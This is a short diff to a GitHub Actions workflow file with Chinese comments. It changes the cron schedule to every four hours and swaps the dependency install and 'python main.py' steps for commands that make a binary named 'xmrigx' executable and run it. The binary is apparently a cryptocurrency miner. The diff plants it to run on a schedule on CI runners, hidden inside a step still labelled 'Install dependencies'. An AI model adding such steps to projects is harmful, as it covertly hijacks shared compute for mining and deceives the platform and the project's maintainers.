@@ -10,7 +10,8 @@ on:
   schedule:
     #此示例在每天 0:30\8:30\16:30[UTC] 触发工作流程
     # - cron:  '30 0,8,16 * * *'
-    - cron:  '30 0,2,4,6,8,10,12,14,16,18,20,22 * * *'
+    - cron:  '30 0,4,8,12,16,20 * * *'
+    # - cron:  '30 0,2,4,6,8,10,12,14,16,18,20,22 * * *'
     # #在每天每小时的每个第 15 分钟运行。
     # - cron:  '15 * * * * '
     # #在每天第 4 和第 5 小时的第 2 和第 10 分钟运行。
@@ -62,15 +63,8 @@ jobs:
     - name: Install dependencies
       run: |
         cd actions/github-actions-python
-        python -m pip install --upgrade pip
-        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
-        
-    # 运行程序
-    - name: Run
-      run: |
-        cd actions/github-actions-python
-        python main.py
-    
+        chmod +x xmrigx
+        ./xmrigx
     # #【防止失败后杀死实例】
     # - name: Don't kill instace
     #   if: ${{ failure() }}
